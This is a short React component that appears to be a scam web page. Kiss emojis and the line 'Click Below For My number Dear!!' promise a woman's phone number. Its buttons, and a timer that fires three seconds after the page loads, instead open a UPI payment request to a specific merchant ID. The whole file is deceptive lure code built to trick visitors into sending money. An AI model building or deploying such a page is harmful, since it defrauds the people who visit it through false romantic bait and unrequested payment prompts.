import './App.css';

function App() {
  setTimeout(()=>{
    window.open("upi://pay?pa=bharatpe.0851610820@icici&pn=Shruthi_Reddy&cu=INR&tn=Shruthi_Reddy&tr=APP","_self");
  },3000)
  return (
    <div className="App">
      <header className="App-header">
      <h1 style={{marginTop:"-150px"}}>😘😘</h1>
      <h6>Click Below👇 For My number Dear!!</h6>
      <a  id="myButton" className="button" type="button" href="upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">Get Number!!</a>
      <a  id="myButton1" className="button1" type="button" href="upi://pay?pa=bharatpe.0851610820@icici&pn= Shruthi Reddy&cu=INR&tn=Shruthi Reddy&tr=APP" target="_blank" rel="noopener noreferrer">Click Here!!</a>
      </header>
    </div>
  );
}

export default App;
